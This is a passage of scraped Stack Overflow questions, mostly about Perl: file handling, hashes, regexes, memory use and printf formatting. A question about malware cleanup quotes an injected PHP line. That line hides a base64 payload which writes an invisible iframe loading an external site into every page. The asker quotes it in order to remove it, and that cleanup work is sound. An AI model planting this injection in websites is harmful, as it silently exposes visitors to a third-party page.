append?</p>\n\n<pre><code>for ($count = 10; $count &gt;= 1; $count--) {\n\n    my $newline = \"text\";\n    my $file1   = \"C:/Users/\";\n    my $file    = $file1 . $count . \".txt\";\n    local @ARGV = ($file);\n    local $^I   = '.bac';\n\n    while (&lt;&gt;) {\n\n        if ($. == 1) {\n\n            print \"$newline$/\";\n        }\n        else {\n\n            print;\n        }\n    }\n}\n</code></pre>\n\n<p>edit: resolved. The solution was in the Perl FAQ</p>\n\n<pre><code>open my $in, '&lt;', $file or die \"Can't read old file: $!\";\nopen my $out, '&gt;', \"$file'\" or die \"Can't write new file: $!\";\nprint $out $newline;\n\nwhile(&lt;$in&gt;) {\n\n    print $out $_;\n}\nclose $out;\n</code></pre>\n"},{"tags":["regex","linux","perl","sed","search-and-replace"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":13041537,"title":"How to delete lines while preserving certain characters via sed/perl?","body":"<p>I'm trying to do a mass search and replace on all .php files for the following string for malware cleanup:</p>\n\n<pre><code>&lt;?php ob_start(\"security_update\"); function security_update($buffer){return $buffer.base64_decode('PHNjcmlwdD5kb2N1bWVudC53cml0ZSgnPHN0eWxlPi52Yl9zdHlsZV9mb3J1bSB7ZmlsdGVyOiBhbHBoYShvcGFjaXR5PTApO29wYWNpdHk6IDAuMDt3aWR0aDogMjAwcHg7aGVpZ2h0OiAxNTBweDt9PC9zdHlsZT48ZGl2IGNsYXNzPSJ2Yl9zdHlsZV9mb3J1bSI+PGlmcmFtZSBoZWlnaHQ9IjE1MCIgd2lkdGg9IjIwMCIgc3JjPSJodHRwOi8vd3d3Lml3cy1sZWlwemlnLmRlL2NvbnRhY3RzLnBocCI+PC9pZnJhbWU+PC9kaXY+Jyk7PC9zY3JpcHQ+');}\n</code></pre>\n\n<p>I can delete the entire line via <code>sed '/buffer.base64_decode/d' file.php</code>. However, I still need the opening <code>&lt;?php</code></p>\n\n<p>So what really needs to be done is a search and replace of <code>buffer.base64_decode</code> for <code>&lt;?php</code> and my brain is all mashed potatoes after a long day in front of this evil computer.</p>\n\n<p>Or maybe I've thought myself into a tiny box and am going about this all wrong?</p>\n\n<p>Any help greatly appreciated!</p>\n"},{"tags":["python","perl","sql-server-2008","parsing"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":96,"score":1,"question_id":13037343,"title":"Best way to parse a file with columns that randomly change order before importing it into SQL Server 2008?","body":"<p>I have a file that has columns that look like this:</p>\n\n<pre><code>Column1,Column2,Column3,Column4,Column5,Column6\n1,2,3,4,5,6\n1,2,3,4,5,6\n1,2,3,4,5,6\n1,2,3,4,5,6\n1,2,3,4,5,6\n1,2,3,4,5,6\nColumn1,Column3,Column2,Column6,Column5,Column4\n1,3,2,6,5,4\n1,3,2,6,5,4\n1,3,2,6,5,4\nColumn2,Column3,Column4,Column5,Column6,Column1\n2,3,4,5,6,1\n2,3,4,5,6,1\n2,3,4,5,6,1\n</code></pre>\n\n<p>The columns randomly re-order in the middle of the file, and the only way to know the order is to look at the last set of headers right before the data (Column1,Column2, etc.)  (I've also simplified the data so that it's easier to picture.  In real life, there is no way to tell data apart as they are all large integer values that could really go into any column)</p>\n\n<p>Obviously this isn't very SQL Server friendly when it comes to using BULK INSERT, so I need to find a way to arrange all of the columns in a consistent order that matches my table's column order in my SQL database.  What's the best way to do this?  I've heard Python is the language to use, but I have never worked with it. Any suggestions/sample scripts in any language are appreciated.</p>\n"},{"tags":["perl","perl-data-structures"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":13048399,"title":"Inserting element to hash of hashes in perl","body":"<p>I have an array. The elements in the array are containing semi colon in between them.</p>\n\n<p>Array looks something like this:</p>\n\n<pre><code>@Array = { \"AUT;E;1\",\n           \"AUT;E;2\",\n           \"CHE;A;1\",\n           \"CHE;C;4\"\n         };\n</code></pre>\n\n<p>I want to split the array elements using ';' (semicolon) as delimiter.</p>\n\n<p>By using hash of hashes I want to store 'AUT' as key and under that want to store E => 1 and E => 2.</p>\n\n<p>i.e I needed the hash as</p>\n\n<pre><code>%HashOfElem = (\n         'AUT' =&gt; {\n                     'E' =&gt; 1,\n                     'E' =&gt; 2\n                  },\n\n         'CHE' =&gt; {\n                     'A' =&gt; 1,\n                     'C' =&gt; 4\n                  }\n              )\n</code></pre>\n\n<p>For that purpose I wrote the following code which is not behaving as expected :(</p>\n\n<pre><code>foreach(@Array)\n{\n    my @TmpArray = split(/;/,$_);\n\n    %HashOfElem = (\n              $TmpArray[0] =&gt; {\n                                  $TmpArray[1] =&gt; $TmpArray[2]\n                              }\n                  );\n</code></pre>\n\n<p>}</p>\n\n<p>If my approach is wrong then which data structure in perl can be used to achieve above purpose? </p>\n\n<p>Please help..</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":13007841,"title":"Is there a better implementation to extract a multiline text structure from one file based on the index from the other file?","body":"<p>I have two files. One is a file of table creation strings dumped from database, the other is the name of tables, with a \"prompt\" as a prefix and a \"...\" as suffix. Just as below:\nfile A (index):</p>\n\n<pre><code>prompt branch...\nprompt branch_param...\nprompt branch_pre_param...\nprompt business...\nprompt business_map...\nprompt business_type...\n</code></pre>\n\n<p>file B (dump):</p>\n\n<pre><code>CREATE TABLE \"KS\".\"BRANCH\"\n (\"BRANCH_CODE\"       CHARACTER(3)    NOT NULL  DEFAULT '',\n  \"BRANCH_NAME\"       CHARACTER(40)   NOT NULL  DEFAULT '',\n  \"PARAM_LEVEL\"       INTEGER         NOT NULL  DEFAULT 0\n )\n  DATA CAPTURE NONE\n IN \"LONG_DATA_TBS\";\n\n\nCREATE TABLE \"KS\".\"BRANCH2BANK\"\n (\"BRANCH_CODE\"         CHARACTER(3)    NOT NULL  DEFAULT '',\n  \"BANK_CODE\"           CHARACTER(6)    NOT NULL  DEFAULT '',\n  \"ACC_COMP_RESULT\"     CHARACTER(1)    NOT NULL  DEFAULT ''\n )\n  DATA CAPTURE NONE\n IN \"SMALL_TBS\";\n\nCREATE TABLE \"KS\".\"BRANCH2BOND\"\n (\"BRANCH_CODE\"        CHARACTER(3)    NOT NULL  DEFAULT '',\n  \"BOND_CODE\"          CHARACTER(8)    NOT NULL  DEFAULT '',\n  \"BOND_NAME\"          CHARACTER(20)   NOT NULL  DEFAULT '',\n  \"TOTAL_AMT\"          DECIMAL(19, 4)  NOT NULL  DEFAULT 0,\n  \"FINANCING_CUST_NO\"  CHARACTER(10)   NOT NULL  DEFAULT '',\n  \"SET_DATE\"           CHARACTER(8)    NOT NULL  DEFAULT '',\n  \"SET_TIME\"           CHARACTER(8)    NOT NULL  DEFAULT '',\n  \"SET_EMP\"            CHARACTER(6)    NOT NULL  DEFAULT '',\n  \"SPARE1\"             CHARACTER(20)   NOT NULL  DEFAULT '',\n  \"SPARE2\"             CHARACTER(20)   NOT NULL  DEFAULT ''\n )\n  DATA CAPTURE NONE\n IN \"SMALL_TBS\";\n\nCREATE TABLE \"KS\".\"BRANCH_PARAM\"\n (\"BRANCH_CODE\"    CHARACTER(3)    NOT NULL  DEFAULT '',\n  \"PARAM_CODE\"     CHARACTER(4)    NOT NULL  DEFAULT '',\n  \"SET_DATE\"       CHARACTER(8)    NOT NULL  DEFAULT '',\n  \"SET_TIME\"       CHARACTER(8)    NOT NULL  DEFAULT ''\n )\n  DATA CAPTURE NONE\n IN \"SMALL_TBS\";\n\nCREATE TABLE \"KS\".\"BRANCH_RESERVE_CREDIT_STOCK\"\n (\"BRANCH_CODE\"  CHARACTER(3)    NOT NULL  DEFAULT '',\n  \"SET_TIME\"     CHARACTER(8)    NOT NULL  DEFAULT ''\n )\n  DATA CAPTURE NONE\n IN \"TX_DATA_TBS\"\n INDEX IN \"TX_INDEX_TBS\";\n</code></pre>\n\n<p>I have written a perl implementation, but I think it is much too ugly and inefficient. Is there a better way to improve this?</p>\n\n<p>my code: (rewritten with Richard and lilydjwg's advice) (last version)</p>\n\n<pre><code>#!/usr/bin/perl\nuse 5.016;\n\nmy (%hash,$cont);\nopen IN,'&lt;',shift;\nwhile(&lt;IN&gt;){\n    chomp;\n    $hash{$1}=1 if /prompt (\\w+)\\.\\.\\./;\n}\nclose IN;\nopen IN,'&lt;',shift;\nwhile(&lt;IN&gt;){\n    chomp;\n    $cont = (defined $hash{lc $1}?say \"prompt $1...\" : 0) if /CREATE TABLE \"KS\"\\.\"(\\w+)\"/;\n    say if $cont == 1;\n}\nclose IN;                   \n</code></pre>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":13042935,"title":"Perl Hashes and regex","body":"<p>I am working on a code that splits sentence into individual words, the words are then searched against hash keys for their presence. My code returns terms that are 100% same, after a match I tag the word from the sentence with the value that corresponds to the matching key. The problem is the code tags terms but with random values not with what I expect. Also, there are situations where the term and the hash key are similar but not 100% identical, \nhow can I write a regular expression to match my terms with the keys. \nNote: I have stemmed the hash keys to their root forms.\nI cam provide some examples: If the term from the sentence is Synergistic or anti-synergistic, and my hash key is Synerg, how can I match the above term with Synerg.  </p>\n\n<p>My code is as follows: </p>\n\n<pre><code>    open IN, \"C:\\\\Users\\\\Desktop\\\\TM\\\\clean_cells.txt\" or die \"import file absent\";\n    my %hash=();\n    use Tie::IxHash;\n    tie %hash =&gt; \"Tie::IxHash\";\n    while(&lt;IN&gt;)\n    {\n    chomp $_;\n    $line=lc $_;\n    @Organs=split/\\t/, $line;\n    $hash{$Organs[0]}=$Organs[1];\n    }\n\n    $Sentence=\"Lymphoma is Lymph Heart and Lung\";\n     @list=split/ /,$Sentence;\n\n     @array=();\n foreach $term(@list)\n {\n chomp $term;\n    for $keys(keys %hash)\n     {\n    if($hash{$term})\n     {\n     $cell=\"&lt;$hash{$keys}&gt;$term&lt;\\/$hash{$keys}&gt;\";\n     push(@array, $cell);\n    }\n    elsif($term=~m/\\b\\Q$keys(\\w+)\\E\\b/)\n    {\n    $cell=\"&lt;$hash{$keys}&gt;$term&lt;\\/$hash{$keys}&gt;\";\n     push(@array, $cell);        \n    }\n    elsif($term=~m/\\b\\Q(\\w+)$keys\\E\\b/)\n    {\n    $cell=\"&lt;$hash{$keys}&gt;$term&lt;\\/$hash{$keys}&gt;\";\n     push(@array, $cell);        \n    }\n    elsif($term=~m/\\b\\Q(\\w+)$keys(\\w+)\\E\\b/)\n    {\n    $cell=\"&lt;$hash{$keys}&gt;$term&lt;\\/$hash{$keys}&gt;\";\n     push(@array, $cell);        \n     }\n}\n}\nprint @array;\n\n for example: hash looks like this: %hash={\n                                      TF1    =&gt; Lymph\n                                Thoracic_duct =&gt;    Lymph\n                                    SK-MEL-1 =&gt; Lymph\n                                       Brain =&gt; Brain\n                                     Cerebellum =&gt;  Brain\n                                         };\n   So if the term TF1 is found it should be substituted to Lymph TF1 /Lymph \n</code></pre>\n"},{"tags":["html","regex","perl"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":121,"score":1,"question_id":13024048,"title":"Perl regular expression for html","body":"<p>I need to extract the IMDB id(example:for the movie 300 it is tt0416449) for a movie specified by the variable URL. I have looked at the page source for this <a href=\"http://www.imdb.com/find?q=300&amp;s=all\" rel=\"nofollow\">page</a> and come up with the following regex</p>\n\n<pre><code>use LWP::Simple;\n$url = \"http://www.imdb.com/search/title?title=$FORM{'title'}\";\n\nif (is_success( $content = LWP::Simple::get($url) ) ) {\n    print \"$url is alive!\\n\";\n} else {\n    print \"No movies found\";\n}\n\n$code = \"\";\n\nif ($content=~/&lt;td class=\"number\"&gt;1\\.&lt;/td&gt;&lt;td class=\"image\"&gt;&lt;a href=\"\\/title\\/tt[\\d]{1,7}\"/s) {\n    $code = $1;\n}\n</code></pre>\n\n<p>I am getting an internal server error at this line</p>\n\n<pre><code>$content=~/&lt;td class=\"number\"&gt;1\\.&lt;/td&gt;&lt;td class=\"image\"&gt;&lt;a href=\"\\/title\\/tt[\\d]{1,7}\"/s\n</code></pre>\n\n<p>I am very new to perl, and would be grateful if anyone could point out my mistake(s).</p>\n"},{"tags":["perl","sorting","hash"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":109,"score":1,"question_id":13043083,"title":"Sorting Huge Hashes in Perl","body":"<p>I am analyzing the frequency of occurrence of groups of words which occur together in a sentence.</p>\n\n<p>Each group consists of 3 words and we have to calculate their frequency.</p>\n\n<p><strong>Example:</strong> This is a good time to party because this is a vacation time.</p>\n\n<p><strong>Expected Output:</strong></p>\n\n<pre><code>this is a - 2\nis a good - 1\na good time - 1\n</code></pre>\n\n<p>and so on.</p>\n\n<p>I have written a script which works good and it prints the frequency and sorts it by descending order.</p>\n\n<p>It works by reading one line at a time from the file. For each line, it will convert them to lowercase, split it into individual words and then form an array out of it.</p>\n\n<p>Then, we pick 3 words at a time starting from the left and keep forming a hash storing the count of occurrence. Once done, we shift the left most element in the array and repeat till the time our array consists of more than 3 words.</p>\n\n<h2><strong>Question Updated:</strong></h2>\n\n<p>The problem is I want to use this script on a file consisting of more than 10 million lines.</p>\n\n<p>After running some tests I observed that it will not work if the number of lines in the input file are more than 400K.</p>\n\n<p>How can I make this script more memory efficient?</p>\n\n<p>Thanks to fxzuz for his suggestions but now I want to make this script work with larger files :)</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nprint \"Enter the File name: \";\nmy $input = &lt;STDIN&gt;;\nchomp $input;\n\nopen INPUT, '&lt;', $input \n    or die(\"Couldn't open the file, $input with error: $!\\n\");\n\nmy %c;\n\nwhile (my $line = &lt;INPUT&gt;) {\n\n    chomp $line;\n    my @x = map lc, split /\\W+/, join \"\", $line;\n\n    while (@x&gt;3) {\n\n        $c{\"@x[0..2]\"}++;\n        shift @x;\n    }\n}\n\nforeach $key (sort {$c{$b} &lt;=&gt; $c{$a}} keys %c) {\n\n    if($c{$key} &gt; 20) {\n\n        print $key.\" - \".$c{$key}.\"\\n\";\n    }\n}\n\nclose INPUT;\n</code></pre>\n\n<p>This works good and it will print the groups of words in descending order of frequency. It will only print those groups of words which occur more than 20 times.</p>\n\n<p>Now, how do I make this work on a file consisting of more than 1 million or 10 million lines?</p>\n\n<p>I also checked the memory and CPU usage of perl while running this script using top command in Linux and observed that the CPU usage reaches 100% and the memory usage is close to 90% while the script runs on a file consisting of 400K lines.</p>\n\n<p>So, it is not feasible to make it work with a file consisting of 1 million lines. Because the perl process will hang.</p>\n\n<p>How can I make this code more memory efficient?</p>\n"},{"tags":["php","javascript","python","perl","curl"],"answer_count":7,"favorite_count":3,"up_vote_count":6,"down_vote_count":0,"view_count":437,"score":6,"question_id":13021622,"title":"Need to ping 1000 urls every 2 minutes","body":"<p>I have 1000 feed urls sitting in a MySQL database table. I need to do a http request to all these urls every 2 minutes. I wrote a php script to do that, but the script takes 5min 30sec to run.</p>\n\n<p>I want to be able to finish all the 1000 requests in under a minute. Is there a way to run multiple async processes to get the job done faster? Any help is appreciated. Thanks in advance.</p>\n"},{"tags":["regex","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":13041718,"title":"Sorting unique high values in file using perl","body":"<p>I have a data file with following lines:</p>\n\n<pre><code>gtssmpar11/dmunit1/mt_dm_fifo_csr_flopped_out/u_gt_ram/wrdataR_reg_0_b171_b174_b236_b242_qreg/d2    19.33    18.65    -0.67 (VIOLATED)\ngtssmpar11/dmunit1/mt_dm_fifo_csr_flopped_out/u_gt_ram/wrdataR_reg_0_b186_b196_b210_b223_qreg/d2    15.09    11.70    -3.39 (VIOLATED)\ngtssmpar21/flunit1/flunitx1/fl_flex1/fl_mt_input_fifo/u_gt_ram/wrdataR_dreg_b103_b104/d2    40.35    36.61    -3.74 (VIOLATED)\ngtssmpar21/flunit1/flunitx1/fl_flex1/fl_mt_input_fifo/u_gt_ram/wrdataR_dreg_b105_b106/d1    11.06     8.77    -2.29 (VIOLATED)\ngtssmpar21/flunit1/flunitx1/fl_flex1/fl_mt_input_fifo/u_gt_ram/wrdataR_dreg_b105_b106/d1    40.08    29.18   -10.90 (VIOLATED)\ngtssmpar21/flunit1/flunitx1/fl_flex1/fl_mt_input_fifo/u_gt_ram/wrdataR_dreg_b119_b120/d2    11.37     8.34    -3.03 (VIOLATED)\ngtssmpar21/flunit1/flunitx1/fl_flex1/fl_mt_input_fifo/u_gt_ram/wrdataR_dreg_b11_b12/d2    14.56     4.41   -10.15 (VIOLATED)\ngtssmpar21/flunit1/flunitx1/fl_flex1/fl_mt_input_fifo/u_gt_ram/wrdataR_dreg_b11_b12/d2    45.82    27.47   -18.34 (VIOLATED)\n</code></pre>\n\n<p>And I need to get the unique value and the smallest one for the fourth column with corresponding 1st column.</p>\n\n<p>Output should be:</p>\n\n<pre><code>gtssmpar11/dmunit1/mt_dm_fifo_csr_flopped_out/u_gt_ram/wrdataR_reg_0_b171_b174_b236_b242_qreg/d2    19.33    18.65    -0.67 (VIOLATED)\ngtssmpar11/dmunit1/mt_dm_fifo_csr_flopped_out/u_gt_ram/wrdataR_reg_0_b186_b196_b210_b223_qreg/d2    15.09    11.70    -3.39 (VIOLATED)\ngtssmpar21/flunit1/flunitx1/fl_flex1/fl_mt_input_fifo/u_gt_ram/wrdataR_dreg_b103_b104/d2    40.35    36.61    -3.74 (VIOLATED)\ngtssmpar21/flunit1/flunitx1/fl_flex1/fl_mt_input_fifo/u_gt_ram/wrdataR_dreg_b105_b106/d1    40.08    29.18   -10.90 (VIOLATED)\ngtssmpar21/flunit1/flunitx1/fl_flex1/fl_mt_input_fifo/u_gt_ram/wrdataR_dreg_b119_b120/d2    11.37     8.34    -3.03 (VIOLATED)\ngtssmpar21/flunit1/flunitx1/fl_flex1/fl_mt_input_fifo/u_gt_ram/wrdataR_dreg_b11_b12/d2    45.82    27.47   -18.34 (VIOLATED)\n</code></pre>\n\n<p>I tried using pattern matching to get the column 1 and column 4 in hash and then sort the hash. But its not working the way i want. Please help.</p>\n\n<pre><code>while(&lt;FILE1&gt;) {\n    my $path = $_;\n    $path =~ /([^\\s]+)/;\n    $path = $1; #Extracting path\n    chop($path);\n    my $slack = $_;\n    #$slack =~ /([^\\s+]+)[\\d+][\\s+][\\d+][\\s+]([^\\f+]+)[\\s](VIOLATED)/;\n    $slack =~ /[^\\f+][\\s+][\\f+][\\s+][\\f+][\\s+]([\\f+]+)[\\s](VIOLATED)/;\n    $slack = $1;\n    print \"$slack\\n\";\n    chop($slack);\n    print FILE2 \"$slack\\n\";\n}\n</code></pre>\n"},{"tags":["php","mysql","regex","perl","csv"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":13039367,"title":"Ordering/Parsing Heterogeneous CSV separated text values in a MySQL row-field","body":"<p>I have a dataset resembling the following - I am very rusty on regex and have no knowledge of 'walking the tree' despite several meagre attempts - Text to Cols in Excel doesn't help due to the asinine organization of the various term classes/tags in the EFFECT_DATA field and the error introduced by manually adjusting. </p>\n\n<h3>SAMPLE DATA</h3>\n\n<pre><code>ROW_ID|NAME   | UNORDERED_CSV_CONCATD_TAG_DATA_STRING\n\n123456|Prod123|\"Minoxidistuff [MoA], Direct [PE], Agonists [EPC]\"\n123457|Prod124|\"Minoxion [Chem], InterferonA [EPC], Delayed [PE]\"\n\n123458|Prod125|\"Anotherion [EPC], Direct [MoA], Agonists [EPC]\"\n123459|Prod126|\"Competitor [PE], Progestin [EPC], Agonists [EPC]\"\n123460|Prod127|\"Minoxidistuff [Chem]\"\n</code></pre>\n\n<h3>Sample desired Data output:</h3>\n\n<pre><code>PRODUCT|EPC      |\nProd125|Antherion|\nProd125|Agonists |\n\nPRODUCT|CMPD         |\nProd127|Minoxidistuff|\nProd124|Minoxion    |\n</code></pre>\n\n<p>etc for all the tags of product[i]tag[j] if that makes sense, essentially ea. CSVD_TAG_DATA field is out of order and contains multiple tags (at the end of the desired terms.</p>\n\n<p>I am starting just a multi-dimensional hash approach ie excuse my butchered regex pseudocode. </p>\n\n<p>Thanks much.</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":65,"score":1,"question_id":13043401,"title":"How to properly declare global variables in Perl?","body":"<p>I am trying to understand variable scope and properly declaring variables in Perl, and I am having a hard time.</p>\n\n<p>The code below basically reads in an excel file, parses it, and spits it out to a new excel file.</p>\n\n<p>However, I am trying to read one of the headers, and if the header matches my string, I want to record that column number, and use it later in the code.</p>\n\n<p>I am getting a \"Use of uninitialized value $site_name_col in print at ./parser.pl line 38.\"</p>\n\n<p>Line 38 is \"print $site_name_col;\"</p>\n\n<p>I realize this print statement is outside the {} where the variable was initially initialized, but it was declared as a global variable at the beginning of the code, so what gives?</p>\n\n<pre><code>#!/usr/bin/perl -w\n\nuse strict;\nuse warnings;\nuse vars qw($site_name_col);\nuse Spreadsheet::WriteExcel;\nuse Spreadsheet::ParseExcel;\n\nmy ($fname1) = @ARGV;\n\nmy $parser   = Spreadsheet::ParseExcel-&gt;new();\nmy $workbook = $parser-&gt;parse($fname1);\n\nmy $new_workbook = Spreadsheet::WriteExcel-&gt;new('formated_list.xls', $fname1);\n\nif (!defined $workbook) {\n\n    die $parser-&gt;error(), \".\\n\";\n}\n\nfor my $worksheet ( $workbook-&gt;worksheets() ) {\n\n    my ($wsheet_name) = $worksheet-&gt;get_name();\n    my $new_worksheet = $new_workbook-&gt;add_worksheet($wsheet_name);  \n\n    my ($row_min, $row_max) = $worksheet-&gt;row_range();\n    my ($col_min, $col_max) = $worksheet-&gt;col_range();\n\n    for my $row ($row_min .. $row_max) {\n\n        for my $col ($col_min .. $col_max) {\n\n            my $cell = $worksheet-&gt;get_cell($row, $col);\n            next unless $cell;\n\n            print \"Row, Col = ($row, $col)\\n\";\n\n            if ( $cell-&gt;value() =~ /Site Name/ ) {\n\n                $site_name_col = $col;\n            }\n            print $site_name_col;\n\n            $new_worksheet-&gt;write($row, $col, $cell-&gt;value());\n        }\n    }\n}\n\n$new_workbook-&gt;close();\n</code></pre>\n"},{"tags":["mysql","performance","perl","security","cgi"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":13043648,"title":"Perl: Handing $dbh off to module. Security and performance?","body":"<p>So I have a cgi script,</p>\n\n<pre><code>#!/usr/bin/perl -T\n\nuse strict;\nuse warnings;\nuse DBI;\nuse WebEngine;\n\n\nmy $dbh = DBI-&gt;connect('DBI:mysql:database', $username, $password)\n    || die \"Could not connect to database: $DBI::errstr\";\n\nmy $we = WebEngine-&gt;new($dbh)\n    or die(\"Failed to instantiate WebEngine object:\\n$!\\n\");\n\n$userID = $we-&gt;register(\"MyUsername\", $dbh);\n</code></pre>\n\n<p>This script creates a database handler and then uses a module I made to deal with most of the back-end of the site to register a username and return a userID number.</p>\n\n<p>I have three questions about this.</p>\n\n<ul>\n<li><p>Does creating this $dbh in this script increase performance by keeping a database connection open?  </p></li>\n<li><p>Could I put the $dbh in my module and not fear being inefficient? </p></li>\n<li><p>Is there a security benefit to keeping the $dbh (and the associated info(I keep my pass in plain text in the code; is that bad?)) in the module that is not directly interacted with through my website?</p></li>\n</ul>\n"},{"tags":["arrays","perl","reference"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":44,"score":2,"question_id":13043960,"title":"How to access an element in a Perl array from a reference to an array of references","body":"<p>I have the following Perl code:</p>\n\n<pre><code>package CustomerCredit;\n#!/usr/local/bin/perl\nuse 5.010;\nuse strict;\n\nmy $TransRef = @_; # This code comes from a sub within the package.\nmy ($Loop, $TransArrRef, $TransID);\nfor ($Loop = 0; $Loop &lt; $$#TransRef; $Loop++)\n{\n   $TransArrRef = $$TransRef[$Loop]; # Gets a ref to an array.\n   $TransID = $$TransArrRef[0];  # Try to get the first value in the array.\n   # The above line generates a compile time syntax error.\n   ...\n}\n</code></pre>\n\n<p>$TransRef is a reference to an array of references to arrays.  I am trying to process each element in the array pointed to by $TransRef.  $TransArrRef should obtain a reference to an array.  I want to assign the first value within that array to $TransID.  But, this statement generates a compile syntax error.</p>\n\n<p>I must be doing something wrong, but can not figure out what it is.  Can anyone help?</p>\n"},{"tags":["perl","windows-vista","manifest","par","packer"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":294,"score":2,"question_id":4441767,"title":"How do I run a PAR packed file in Windows Vista or Windows 7 running with higher privileges?","body":"<p>Does anyone know how to make a <a href=\"http://par.perl.org\" rel=\"nofollow\">PAR</a> packed Perl application run with higher privileges?\nI've read that there must be somewhere some kind of manifest file, but how should this file look like and how to combine it with the PAR packed executable? This is still unknown to me.</p>\n\n<p>Any ideas?</p>\n"},{"tags":["regex","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":13041760,"title":"regex on whole string with multistring failed","body":"<p>The code:</p>\n\n<pre><code>#!/usr/bin/perl\nmy $string=\"string\\nstring2\\nstring3\";\nprint \"$string\\n-----\\n\";\n$string=~s/^.*$/_/;\nprint \"$string\\n-----\\n\";\n</code></pre>\n\n<p>The Output:</p>\n\n<pre><code>string\nstring2\nstring3\n-----\nstring\nstring2\nstring3\n-----\n</code></pre>\n\n<p>Expected Outputs:</p>\n\n<p>1:</p>\n\n<pre><code>string\nstring2\nstring3\n-----\n_\n-----\n</code></pre>\n\n<p>2:</p>\n\n<pre><code>string\nstring2\nstring3\n-----\n_\nstring2\nstring3\n-----\n</code></pre>\n\n<p>3: (like /m modifer):</p>\n\n<pre><code>string\nstring2\nstring3\n-----\n_\n_\n_\n-----\n</code></pre>\n\n<p>The question: Why without <code>/m</code> <code>^</code>..<code>$</code> broke things ? What i missed in regex docs ?</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":13041111,"title":"put next lines in an array after finding the matched pattern in Perl","body":"<p>I open a text report inside my <strong>Perl script</strong> and need to find the specific lines and store them in arrays.</p>\n\n<pre><code>this is my report which I need to process through:\nmatched pattern 1 \nline1:10\nline2:20\nline3:30\n\nnext matched pattern 2\nline1:5\nline2:10\nline3:15\n\nnext matched pattern 3\nlineA:A\nlineB:B\nlineC:C\n.\n.\n------------------------------------\n</code></pre>\n\n<p>this part is my script:</p>\n\n<pre><code>@numbers;\n@numbers2;\n@letters;\nwhile (&lt;FILE&gt;)\n{\n if ($_ =~/matched pattern 1/ &amp;&amp; $_ ne \"\\n\")\n {\n   chomp();\n   push (@numbers,$_)\n }\n if ($_ =~/next matched pattern 2/ &amp;&amp; $_ ne \"\\n\")\n {\n   chomp();\n   push (@numbers2,$_)\n }\n if ($_ =~/next matched pattern 3/ &amp;&amp; $_ ne \"\\n\")\n {\n   chomp();\n   push (@letters,$_)\n }\n}\n</code></pre>\n\n<p>then I can use numbers and letters inside the arrays.\nthis is a part of my report file</p>\n\n<pre><code>Maximum points per Lab\nLab1:10\nLab2:30\nLab3:20\n\n\nMaximum points per Exam\nExam1:50\nExam2:50\n\nMaximum points on Final\nFinal:150\n</code></pre>\n"},{"tags":["perl"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":54,"score":0,"question_id":13041239,"title":"parsing in Perl","body":"<p>Using Perl, I'm trying to parse Medline/Pubmed links in order to finally pass each link to a pmid2doi conversion website &lt; <a href=\"http://www.pmid2doi.org/\" rel=\"nofollow\">http://www.pmid2doi.org/</a> > ...  and return the  ...</p>\n\n<p>the structure of each link is of the form...</p>\n\n<pre><code>/xxxxx/xxxxx/xxxxx/xxxxx/xxxxx/UNC00000000000042/00223468/v45i3/S0022346809003820\n--ls\n18507872 main.pdf main.raw main.xml\n\nwhere \nS0022346809003820  is a PII identifier\n00223468  is a PMID identifier\n</code></pre>\n\n<p>so far, in bash i've got something that looks like this...</p>\n\n<pre><code>for doi in \nfind . -name \"*.xml\" | awk -F\\/ '{print $4}' \n\ndo\n    echo  $doi\n    wget http://www.pmid2doi.org/\ndone\n</code></pre>\n\n<p>i'd like to get something like this running in Perl...  </p>\n\n<p>i'm grateful for an insights...?</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":67,"score":1,"question_id":13038611,"title":"Formatting output with printf in perl","body":"<p>I'm trying to format my output to look like it's in columns.  I've been looking online but haven't been able to find something that will help me do it.  I'm trying to use the printf function.</p>\n\n<p>Here's what I have:</p>\n\n<pre><code>printf(\"%s %10s %12s %10s\\n\", \"Qty\", \"Desc.\", \"Unit \\$\", \"Total\");\n\nfor ($he = 0; $he &lt;= 6; $he++) {\n\n    if (@quantity[$he] != 0) {\n\n        printf(\"%d %10s %12.2f %10.2f\\n\", @quantity[$he], @selections[$he], @prices[$he], @prices[$he] * @quantity[$he])\n    }\n}\n</code></pre>\n\n<p>I'm trying to make it so that the second printf inside of the if statement of the for loop lines up with the \"Qty\", \"Desc.\", \"Unit \\$\" and \"Total.\"</p>\n\n<p>Thank you!</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":65,"score":-3,"question_id":13038898,"title":"Getting fixed width columnar output using printf in Perl","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/13038611/formatting-output-with-printf-in-perl\">Formatting output with printf in perl</a>  </p>\n</blockquote>\n\n\n\n<pre><code>my @selections = (\"Hamburger\",\"Frankfurter\",\"French Fries\",\"Large Coke\",\"Medium Coke\",\"Small 